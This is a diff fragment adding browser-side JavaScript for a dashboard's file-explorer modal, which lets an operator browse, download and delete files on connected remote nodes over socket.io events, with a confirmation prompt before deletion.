+      listEl.innerHTML = html;
+    }
+
+    window.openExplorerModal = function (nodeId) {
+      activeExplorerNodeId = nodeId;
+      if (!directoryViews[nodeId]) {
+        requestDirectory(nodeId, "");
+      }
+      renderExplorerModal();
+      const modal = document.getElementById("explorerModal");
+      if (modal) modal.classList.remove("hidden");
+      const input = document.getElementById("modal-dir-path");
+      if (input) setTimeout(() => input.focus(), 50);
+    }
+
+    window.closeExplorerModal = function () {
+      const modal = document.getElementById("explorerModal");
+      if (modal) modal.classList.add("hidden");
+      activeExplorerNodeId = null;
+    }
+
+    window.handleExplorerModalPathKey = function (e) {
+      if (e.key === "Enter") {
+        e.preventDefault();
+        if (!activeExplorerNodeId) return;
+        const input = document.getElementById("modal-dir-path");
+        if (!input) return;
+        const p = input.value.trim();
+        requestDirectory(activeExplorerNodeId, p);
+      }
+    }
+
+    window.explorerModalRefresh = function () {
+      if (!activeExplorerNodeId) return;
+      const view = directoryViews[activeExplorerNodeId];
+      const target = view && view.path ? view.path : "";
+      requestDirectory(activeExplorerNodeId, target);
+    }
+
+    window.explorerModalUp = function () {
+      if (!activeExplorerNodeId) return;
+      const view = directoryViews[activeExplorerNodeId];
+      if (!view) {
+        requestDirectory(activeExplorerNodeId, "");
+        return;
+      }
+      const target = view.parentPath || view.path || "";
+      requestDirectory(activeExplorerNodeId, target);
+    }
+
+    window.openExplorerMenu = function (e, nodeId) {
+      e.preventDefault();
+      const row = e.currentTarget;
+      if (!row) return;
+      const path = row.getAttribute("data-path") || "";
+      const isDir = row.getAttribute("data-isdir") === "1";
+      explorerContext = { nodeId, path, isDir };
+      const menu = document.getElementById("explorerContextMenu");
+      if (!menu) return;
+      menu.style.left = e.clientX + "px";
+      menu.style.top = e.clientY + "px";
+      menu.classList.remove("hidden");
+    }
+
+    function closeExplorerMenu() {
+      const menu = document.getElementById("explorerContextMenu");
+      if (menu) menu.classList.add("hidden");
+    }
+
+    document.addEventListener("click", function () {
+      closeExplorerMenu();
+    });
+
+    window.copyFromContext = function () {
+      if (!explorerContext) return;
+      if (explorerContext.isDir) {
+        alert("Copy is only supported for files at the moment.");
+        closeExplorerMenu();
+        return;
+      }
+      socket.emit("download_remote_file", {
+        nodeId: explorerContext.nodeId,
+        path: explorerContext.path
+      });
+      closeExplorerMenu();
+    }
+
+    window.deleteFromContext = function () {
+      if (!explorerContext) return;
+      const kind = explorerContext.isDir ? "folder and all its contents" : "file";
+      if (!confirm(`Delete this ${kind}?\n\n${explorerContext.path}`)) {
+        closeExplorerMenu();
+        return;
+      }
+      socket.emit("delete_remote_path", {
+        nodeId: explorerContext.nodeId,
+        path: explorerContext.path
+      });
+      closeExplorerMenu();
+    }
+
+    socket.on("delete_result", ({ client, path, success, error }) => {
+      if (!success) {
+        if (error) alert("Delete failed: " + error);
+        return;
+      }
+      // Refresh the current directory view for that client
+      refreshDirectory(client);
+    });
+
+    socket.on("file_data", ({ client, path, name, size, contentBase64, error }) => {
+      if (error) {
+        alert("Download failed: " + error);
+        return;
+      }
+      if (!contentBase64) {
+        alert("File is empty or no content received.");
+        return;
+      }
+      try {
+        const byteCharacters = atob(contentBase64);
+        const byteNumbers = new Array(byteCharacters.length);
+        for (let i = 0; i < byteCharacters.length; i++) {
+          byteNumbers[i] = byteCharacters.charCodeAt(i);
+        }
+        const byteArray = new Uint8Array(byteNumbers);
+        const blob = new Blob([byteArray], { type: "application/octet-stream" });
+        const url = URL.createObjectURL(blob);
+        const a = document.createElement("a");
+        a.href = url;
+        a.download = name || "download.bin";
+        document.body.appendChild(a);
+        a.click();
+        document.body.removeChild(a);
+        URL.revokeObjectURL(url);
+      } catch (e) {
+        alert("Error creating download: " + e);
+      }
+    });
+  </script>
+</body>
+
+</html>
